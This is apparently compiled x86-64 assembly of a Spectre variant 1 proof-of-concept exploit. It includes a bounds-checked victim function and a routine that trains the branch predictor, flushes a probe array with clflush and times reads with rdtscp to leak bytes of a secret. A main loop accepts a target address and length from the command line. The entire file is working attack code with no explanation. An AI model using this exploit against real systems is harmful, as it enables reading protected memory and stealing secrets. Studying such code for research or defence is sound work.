	.text
	.globl	check
	.type	check, @function
check:
.LFB4373:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
	movl	array1_size(%rip), %eax
	cltq
	cmpq	%rax, -8(%rbp)
	jnb	.L2
	movl	$1, %eax
	jmp	.L3
.L2:
	movl	$0, %eax
.L3:
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4373:
	.size	check, .-check
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB4374:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -24(%rbp)
	movl	array1_size(%rip), %eax
	cltq
	cmpq	%rax, -24(%rbp)
	jnb	.L8
	movq	-24(%rbp), %rax
	subl	$1, %eax
	movl	%eax, -4(%rbp)
	jmp	.L6
.L7:
	movl	-4(%rbp), %eax
	cltq
	leaq	array1(%rip), %rdx
	movzbl	(%rax,%rdx), %eax
	movzbl	%al, %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	movzbl	(%rax,%rdx), %edx
	movzbl	temp(%rip), %eax
	andl	%edx, %eax
	movb	%al, temp(%rip)
	subl	$1, -4(%rbp)
.L6:
	cmpl	$0, -4(%rbp)
	jns	.L7
.L8:
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4374:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB4375:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%r12
	pushq	%rbx
	addq	$-128, %rsp
	.cfi_offset 12, -24
	.cfi_offset 3, -32
	movq	%rdi, -120(%rbp)
	movq	%rsi, -128(%rbp)
	movq	%rdx, -136(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$0, -104(%rbp)
	movl	$0, -92(%rbp)
	jmp	.L10
.L11:
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results(%rip), %rax
	movl	$0, (%rdx,%rax)
	addl	$1, -92(%rbp)
.L10:
	cmpl	$255, -92(%rbp)
	jle	.L11
	movl	$999, -96(%rbp)
	jmp	.L12
.L24:
	movl	$0, -92(%rbp)
	jmp	.L13
.L14:
	movl	-92(%rbp), %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -56(%rbp)
	movq	-56(%rbp), %rax
	clflush	(%rax)
	nop
	addl	$1, -92(%rbp)
.L13:
	cmpl	$255, -92(%rbp)
	jle	.L14
	movl	array1_size(%rip), %ecx
	movl	-96(%rbp), %eax
	cltd
	idivl	%ecx
	movl	%edx, %eax
	cltq
	movq	%rax, -80(%rbp)
	movl	$29, -88(%rbp)
	jmp	.L15
.L18:
	leaq	array1_size(%rip), %rax
	movq	%rax, -48(%rbp)
	movq	-48(%rbp), %rax
	clflush	(%rax)
	nop
	movl	$0, -100(%rbp)
	jmp	.L16
.L17:
	movl	-100(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -100(%rbp)
.L16:
	movl	-100(%rbp), %eax
	cmpl	$99, %eax
	jle	.L17
	movl	-88(%rbp), %ecx
	movslq	%ecx, %rax
	imulq	$715827883, %rax, %rax
	shrq	$32, %rax
	movl	%ecx, %esi
	sarl	$31, %esi
	movl	%eax, %edx
	subl	%esi, %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %edx
	leal	-1(%rdx), %eax
	movw	$0, %ax
	cltq
	movq	%rax, -64(%rbp)
	movq	-64(%rbp), %rax
	shrq	$16, %rax
	orq	%rax, -64(%rbp)
	movq	-120(%rbp), %rax
	xorq	-80(%rbp), %rax
	andq	-64(%rbp), %rax
	xorq	-80(%rbp), %rax
	movq	%rax, -64(%rbp)
	movq	-64(%rbp), %rax
	movq	%rax, %rdi
	call	victim_function
	subl	$1, -88(%rbp)
.L15:
	cmpl	$0, -88(%rbp)
	jns	.L18
	movl	$0, -92(%rbp)
	jmp	.L19
.L23:
	movl	-92(%rbp), %eax
	imull	$167, %eax, %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -84(%rbp)
	movl	-84(%rbp), %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -72(%rbp)
	leaq	-104(%rbp), %rax
	movq	%rax, -32(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-32(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	movq	%rax, %r12
	movq	-72(%rbp), %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	movl	%eax, -104(%rbp)
	leaq	-104(%rbp), %rax
	movq	%rax, -40(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-40(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	subq	%r12, %rax
	movq	%rax, %rbx
	cmpq	$50, %rbx
	ja	.L22
	movl	array1_size(%rip), %ecx
	movl	-96(%rbp), %eax
	cltd
	idivl	%ecx
	movl	%edx, %eax
	cltq
	leaq	array1(%rip), %rdx
	movzbl	(%rax,%rdx), %eax
	movzbl	%al, %eax
	cmpl	%eax, -84(%rbp)
	je	.L22
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results(%rip), %rax
	movl	(%rdx,%rax), %eax
	leal	1(%rax), %ecx
	movl	-84(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results(%rip), %rax
	movl	%ecx, (%rdx,%rax)
.L22:
	addl	$1, -92(%rbp)
.L19:
	cmpl	$255, -92(%rbp)
	jle	.L23
	subl	$1, -96(%rbp)
.L12:
	cmpl	$0, -96(%rbp)
	jg	.L24
	movl	results(%rip), %eax
	movl	%eax, %edx
	movl	-104(%rbp), %eax
	xorl	%edx, %eax
	movl	%eax, results(%rip)
	nop
	movq	-24(%rbp), %rax
	subq	%fs:40, %rax
	je	.L25
	call	__stack_chk_fail@PLT
.L25:
	subq	$-128, %rsp
	popq	%rbx
	popq	%r12
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4375:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata
	.align 8
.LC1:
	.string	"Putting '%s' in memory, address %p\n"
.LC2:
	.string	"%p"
.LC3:
	.string	"%d"
	.align 8
.LC4:
	.string	"Trying malicious_x = %p, len = %d\n"
.LC5:
	.string	"Reading %d bytes:\n"
	.align 8
.LC6:
	.string	"Reading at malicious_x = %p secc= %c sec_ascii=%d ...\n"
.LC7:
	.string	"result[%d]=%d "
.LC8:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4376:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$96, %rsp
	movl	%edi, -84(%rbp)
	movq	%rsi, -96(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
.L40:
	call	getchar@PLT
	movb	%al, -65(%rbp)
	cmpb	$114, -65(%rbp)
	jne	.L27
	movq	secret(%rip), %rdx
	movq	secret(%rip), %rax
	movq	%rax, %rsi
	leaq	.LC1(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	secret(%rip), %rax
	leaq	array1(%rip), %rdx
	subq	%rdx, %rax
	movq	%rax, -40(%rbp)
	movq	secret(%rip), %rax
	movq	%rax, %rdi
	call	strlen@PLT
	movl	%eax, -64(%rbp)
	movq	$0, -32(%rbp)
	jmp	.L28
.L29:
	leaq	array2(%rip), %rdx
	movq	-32(%rbp), %rax
	addq	%rdx, %rax
	movb	$1, (%rax)
	addq	$1, -32(%rbp)
.L28:
	cmpq	$131071, -32(%rbp)
	jbe	.L29
	cmpl	$3, -84(%rbp)
	jne	.L30
	movq	-96(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-40(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	movq	-40(%rbp), %rax
	leaq	array1(%rip), %rdx
	subq	%rdx, %rax
	movq	%rax, -40(%rbp)
	movq	-96(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-64(%rbp), %rdx
	leaq	.LC3(%rip), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	movl	-64(%rbp), %eax
	movq	-40(%rbp), %rdx
	movq	%rdx, %rcx
	movl	%eax, %edx
	movq	%rcx, %rsi
	leaq	.LC4(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
.L30:
	movl	-64(%rbp), %eax
	movl	%eax, %esi
	leaq	.LC5(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, -60(%rbp)
	jmp	.L31
.L35:
	movq	secret(%rip), %rdx
	movl	-60(%rbp), %eax
	cltq
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movsbl	%al, %edx
	movq	secret(%rip), %rcx
	movl	-60(%rbp), %eax
	cltq
	addq	%rcx, %rax
	movzbl	(%rax), %eax
	movsbl	%al, %eax
	movq	-40(%rbp), %rcx
	movq	%rcx, %rsi
	movl	%edx, %ecx
	movl	%eax, %edx
	leaq	.LC6(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	addl	$1, -60(%rbp)
	movq	-40(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -40(%rbp)
	leaq	-20(%rbp), %rdx
	leaq	-10(%rbp), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	call	readMemoryByte
	movl	results(%rip), %eax
	movl	%eax, -52(%rbp)
	movl	$1, -56(%rbp)
	jmp	.L32
.L34:
	movl	-56(%rbp), %eax
	subl	$1, %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results(%rip), %rax
	movl	(%rdx,%rax), %eax
	movl	%eax, -48(%rbp)
	movl	-56(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results(%rip), %rax
	movl	(%rdx,%rax), %eax
	movl	%eax, -44(%rbp)
	movl	-48(%rbp), %eax
	cmpl	-44(%rbp), %eax
	jle	.L33
	movl	-48(%rbp), %eax
	subl	-44(%rbp), %eax
	cmpl	$100, %eax
	jle	.L33
	movl	-56(%rbp), %eax
	subl	$1, %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results(%rip), %rax
	movl	(%rdx,%rax), %eax
	movl	-56(%rbp), %edx
	leal	-1(%rdx), %ecx
	movl	%eax, %edx
	movl	%ecx, %esi
	leaq	.LC7(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	-56(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results(%rip), %rax
	movl	(%rdx,%rax), %edx
	movl	-56(%rbp), %eax
	movl	%eax, %esi
	leaq	.LC7(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
.L33:
	addl	$1, -56(%rbp)
.L32:
	cmpl	$255, -56(%rbp)
	jle	.L34
	movl	$10, %edi
	call	putchar@PLT
.L31:
	movl	-64(%rbp), %eax
	subl	$1, %eax
	movl	%eax, -64(%rbp)
	movl	-64(%rbp), %eax
	testl	%eax, %eax
	jns	.L35
	jmp	.L40
.L27:
	cmpb	$10, -65(%rbp)
	je	.L43
	cmpb	$105, -65(%rbp)
	jne	.L44
	movl	$0, %eax
	call	getpid@PLT
	movl	%eax, %edx
	leaq	check(%rip), %rax
	addq	$33, %rax
	movq	%rax, %rsi
	leaq	.LC8(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	jmp	.L40
.L43:
	nop
	jmp	.L40
.L44:
	nop
	movl	$0, %eax
	movq	-8(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L42
	call	__stack_chk_fail@PLT
.L42:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4376:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
